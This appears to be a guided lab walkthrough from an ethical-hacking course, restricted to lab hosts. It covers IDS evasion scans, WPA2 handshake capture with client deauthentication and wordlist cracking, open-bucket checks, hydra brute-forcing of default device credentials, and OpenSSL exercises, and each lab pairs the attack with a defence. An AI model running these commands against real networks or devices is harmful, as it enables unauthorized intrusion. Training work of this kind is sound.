---
session: 10
title: Evasion, Wireless & Emerging Tech — Guided Lab Walkthrough (FINAL)
---

# Session 10 — Guided Lab Walkthrough (FINAL)

> Lab hosts, your own AP/adapter, and your own cloud/devices ONLY.

## Lab A — Evade a watching IDS
```bash
# baseline (IDS should alert):
nmap -sS -sV 192.168.56.20
tail -f /var/log/suricata/fast.log
# evasion:
nmap -f --source-port 53 -sS 192.168.56.20      # fragment + source-port
nmap -D RND:10 -T2 -sS 192.168.56.20            # decoys + slow
# defender: enable full stream/frag reassembly + anomaly rules -> re-detected
```

## Lab B — Capture & crack a WPA2 handshake (YOUR AP)
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                                    # find your test AP
sudo airodump-ng -c <CH> --bssid <AP_MAC> -w cap wlan0mon    # capture on its channel
sudo aireplay-ng --deauth 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon   # force handshake
aircrack-ng cap-01.cap -w /usr/share/wordlists/rockyou.txt   # crack (weak passphrase)
sudo airmon-ng stop wlan0mon                                 # restore adapter
# defence: long random passphrase or WPA3 -> won't crack
```

## Lab C — Open bucket + default device (YOUR resources)
```bash
aws s3 ls s3://ceh-lab-test-bucket --no-sign-request         # public? -> finding
curl -s https://ceh-lab-test-bucket.s3.amazonaws.com/        # anonymous listing?
# re-apply Block Public Access, re-test -> closed
hydra -l admin -P defaults.txt <lab-device-ip> http-get /    # default creds -> finding
```

## Lab D — Crypto hands-on + audit
```bash
echo -n 'data' | sha256sum                                   # hashing (integrity)
openssl enc -aes-256-cbc -pbkdf2 -in f -out f.enc            # symmetric (confidentiality)
openssl genrsa -out k.pem 2048; openssl rsa -in k.pem -pubout -out k.pub  # asymmetric
openssl dgst -sha256 -sign k.pem -out sig f                  # sign (private key)
openssl dgst -sha256 -verify k.pub -signature sig f          # verify (public key)
nmap --script ssl-enum-ciphers -p 443 TARGET                 # audit: weak ciphers = finding
```

## Lab E — Defence-in-depth capstone
Assess the lab across all ten sessions; frame findings as a defence-in-depth chain (what failed / what held); prioritise by leverage; write it up in `exercises/session-10/capstone_report_template.md`. This is your portfolio piece.
